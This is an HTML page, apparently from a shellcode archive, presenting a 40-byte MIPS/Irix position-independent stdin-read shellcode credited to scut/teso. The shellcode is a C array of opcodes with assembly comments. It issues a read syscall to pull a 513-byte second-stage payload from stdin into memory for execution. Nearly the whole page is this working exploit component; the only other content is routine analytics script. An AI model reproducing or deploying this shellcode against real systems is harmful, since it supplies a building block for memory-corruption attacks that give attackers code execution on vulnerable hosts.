<html><head><title>Irix - stdin-read shellcode - 40 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 40 byte MIPS/Irix PIC stdin-read shellcode. -scut/teso
 */
unsigned long int shellcode[] = {
                0x24048cb0,     /* li           $a0, -0x7350            */
/* dpatch: */   0x0490ffff,     /* bltzal       $a0, dpatch             */
                0x2804ffff,     /* slti         $a0, $zero, -1          */
                0x240fffe3,     /* li           $t7, -29                */
                0x01e07827,     /* nor          $t7, $t7, $zero         */
                0x03ef2821,     /* addu         $a1, $ra, $t7           */
                0x24060201,     /* li           $a2, 0x0201 (513 bytes) */
                0x240203eb,     /* li           $v0, SYS_read           */
                0x0101010c,     /* syscall                              */
                0x24187350,     /* li           $t8, 0x7350 (nop)       */
};


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
